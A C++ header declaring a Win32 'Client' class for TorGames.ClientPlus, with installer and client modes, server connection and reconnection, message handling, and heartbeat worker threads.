// TorGames.ClientPlus - Main client class
#pragma once

#include "common.h"
#include "protocol.h"

enum class ClientMode {
    Installer,  // First run - installs and becomes client
    Client      // Normal operation
};

class Client {
public:
    Client();
    ~Client();

    // Initialize and run
    bool Initialize(ClientMode mode);
    void Run();
    void Stop();

    // Getters
    bool IsRunning() const { return m_running; }
    ClientMode GetMode() const { return m_mode; }

private:
    // Connection management
    bool Connect();
    void Disconnect();
    void Reconnect();

    // Message handling
    void ProcessMessages();
    void HandleServerMessage(const ServerMessage& msg);
    void SendHeartbeat();

    // Worker threads
    static DWORD WINAPI HeartbeatThreadProc(LPVOID param);
    static DWORD WINAPI MessageThreadProc(LPVOID param);

    // Members
    Protocol m_protocol;
    ClientMode m_mode;
    std::string m_hardwareId;
    std::string m_clientType;

    bool m_running;
    bool m_shouldReconnect;

    HANDLE m_heartbeatThread;
    HANDLE m_messageThread;
    HANDLE m_stopEvent;

    DWORD m_lastHeartbeat;
};
